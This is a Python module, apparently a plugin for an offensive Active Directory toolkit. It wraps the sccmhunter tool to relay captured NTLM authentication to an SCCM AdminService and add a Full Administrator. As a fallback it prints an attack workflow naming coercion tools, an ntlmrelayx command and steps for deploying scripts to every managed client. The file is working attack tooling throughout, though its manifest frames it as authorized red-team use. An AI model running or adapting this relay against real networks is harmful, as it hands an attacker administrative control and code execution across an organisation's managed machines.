"""SCCM NTLM relay to AdminService via SCCMHunter.

Relays captured NTLM authentication to the SCCM AdminService endpoint,
leveraging impacket's ntlmrelayx framework with a custom HTTPSRelayClient.
On successful relay, adds a Full Administrator to the SCCM hierarchy,
enabling command execution on all managed clients.

Source: https://github.com/garrettfoster13/sccmhunter (MIT)
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.sccm.sccm_relay.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_relay", "sccm_admin_creation", "https_interception"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001", "T1072"],
    "source": "https://github.com/garrettfoster13/sccmhunter",
}


def _find_sccmhunter() -> str | None:
    for name in ("sccmhunter", "sccmhunter.py"):
        path = shutil.which(name)
        if path:
            return path
    for d in ("/opt/tools/sccmhunter", os.path.expanduser("~/tools/sccmhunter")):
        candidate = os.path.join(d, "sccmhunter.py")
        if os.path.isfile(candidate):
            return candidate
    return None


def run(args: Any) -> int:
    """Relay NTLM authentication to SCCM AdminService.

    Starts an NTLM relay listener that forwards captured authentication
    to the SCCM AdminService, adding the relayed principal as a Full
    Administrator in the SCCM hierarchy.

    Args:
        args.target: SCCM site server hostname or IP.
        args.domain: AD domain.
        args.site_code: SCCM site code (e.g. PS1).
        args.listen_port: Local listener port (default 445).
        args.socks: Use SOCKS proxy for relay.
    """
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    site_code = getattr(args, "site_code", None)
    listen_port = getattr(args, "listen_port", 445)

    print("[*] SCCM NTLM Relay to AdminService")
    print(f"[*] Target site server: {target}")
    print(f"[*] Domain: {cred.domain}")
    if site_code:
        print(f"[*] Site code: {site_code}")

    sccmhunter = _find_sccmhunter()
    if sccmhunter:
        cmd = [sys.executable, sccmhunter, "relay"]
        auth = "{}\\{}".format(cred.domain, cred.username or "")
        cmd.extend(["-u", auth])
        if cred.password:
            cmd.extend(["-p", cred.password])
        if target:
            cmd.extend(["-target", target])
        if site_code:
            cmd.extend(["-sc", site_code])

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)
        return result.returncode

    print("[!] sccmhunter not found")
    print()
    print("[*] SCCM relay attack workflow:")
    print("  1. Trigger NTLM authentication (coercion or poisoning)")
    print("     PetitPotam, PrinterBug, DFSCoerce, Responder, etc.")
    print()
    print("  2. Relay to SCCM AdminService (HTTPS):")
    print("     ntlmrelayx.py -t https://SCCM-SERVER/AdminService/wmi/")
    print("     Uses custom HTTPSRelayClient for AdminService API")
    print()
    print("  3. On successful relay, add Full Administrator:")
    print("     POST to /AdminService/wmi/SMS_Admin")
    print("     Grants full control over SCCM hierarchy")
    print()
    print("  4. Execute commands on managed clients:")
    print("     sccmhunter admin -u DOMAIN\\user -p pass -target SCCM")
    print("     Deploys scripts/applications to any managed device")
    print()
    print("[*] Install: pip install sccmhunter")
    return 1
